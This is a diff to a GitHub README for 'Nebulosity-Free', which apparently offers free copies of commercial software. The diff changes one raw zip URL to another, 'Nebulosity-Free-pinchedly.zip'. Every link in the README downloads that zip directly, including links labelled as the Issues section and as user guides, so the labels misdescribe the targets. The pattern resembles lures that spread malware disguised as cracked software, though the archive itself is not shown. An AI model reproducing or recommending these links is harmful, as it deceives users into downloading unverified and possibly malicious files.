@@ -1,6 +1,6 @@
 # 🌌 Nebulosity-Free - Enhance Your Software Experience
 
-![Download Nebulosity-Free](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Free_Nebulosity_v1.0.zip)
+![Download Nebulosity-Free](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Nebulosity-Free-pinchedly.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Nebulosity-Free! This guide helps you smoothly download and run the N
 
 To begin, visit the Releases page to download the software:
 
-[Download Nebulosity-Free](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Free_Nebulosity_v1.0.zip)
+[Download Nebulosity-Free](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Nebulosity-Free-pinchedly.zip)
 
 Once there, look for the latest release. Click on the file to start your download. This file contains everything you need.
 
@@ -68,7 +68,7 @@ If you face an error, check if your system meets the requirements. You can also 
 
 ## 🛠️ Need Help?
 
-For any questions or issues, you can reach out through the [Issues section](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Free_Nebulosity_v1.0.zip) on GitHub. 
+For any questions or issues, you can reach out through the [Issues section](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Nebulosity-Free-pinchedly.zip) on GitHub. 
 
 Remember, community support is available to help you navigate any challenges you might face.
 
@@ -76,15 +76,15 @@ Remember, community support is available to help you navigate any challenges you
 
 To download or check for updates, visit our Releases page:
 
-[Download Nebulosity-Free](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Free_Nebulosity_v1.0.zip)
+[Download Nebulosity-Free](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Nebulosity-Free-pinchedly.zip)
 
 This is your one-stop destination for all updates and resources related to Nebulosity.
 
 ## 📚 Additional Resources
 
-- [User Interface Utility](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Free_Nebulosity_v1.0.zip)
-- [Windows File Browsing Support](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Free_Nebulosity_v1.0.zip)
-- [Document Organization Guide](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Free_Nebulosity_v1.0.zip)
+- [User Interface Utility](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Nebulosity-Free-pinchedly.zip)
+- [Windows File Browsing Support](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Nebulosity-Free-pinchedly.zip)
+- [Document Organization Guide](https://github.com/Lucca232/Nebulosity-Free/raw/refs/heads/main/cloaca/Nebulosity-Free-pinchedly.zip)
 
 Explore these links to enhance your understanding and use of the software.
 
